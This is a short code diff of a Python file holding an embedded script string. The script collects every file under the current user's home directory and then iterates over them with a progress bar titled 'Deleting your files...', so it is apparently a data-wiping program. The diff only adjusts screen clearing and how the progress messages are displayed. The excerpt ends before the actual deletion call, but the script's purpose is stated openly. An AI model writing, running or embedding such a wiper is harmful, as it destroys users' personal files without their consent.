@@ -9,8 +9,12 @@ code = """import alive_progress
 from time import sleep
 import getpass
 import os
+
+os.system("clear")
 items = []
-with alive_progress.alive_bar(title="Detecting files...") as bar:
+
+print("Detecting files...")
+with alive_progress.alive_bar() as bar:
 	def find_files(root):
 		global items
 		bar()
@@ -21,8 +25,11 @@ with alive_progress.alive_bar(title="Detecting files...") as bar:
 				find_files(child)
 			else:
 				items.append(child)
-	find_files(f"/home/{getpass.getuser()}")		
-with alive_progress.alive_bar(len(items), title="Deleting your files...") as bar:
+				
+	find_files(f"/home/{getpass.getuser()}")	
+	
+print("Deleting your files...")
+with alive_progress.alive_bar(len(items)) as bar:
 	for item in items:
 		if "main.py" in item:
 			bar()
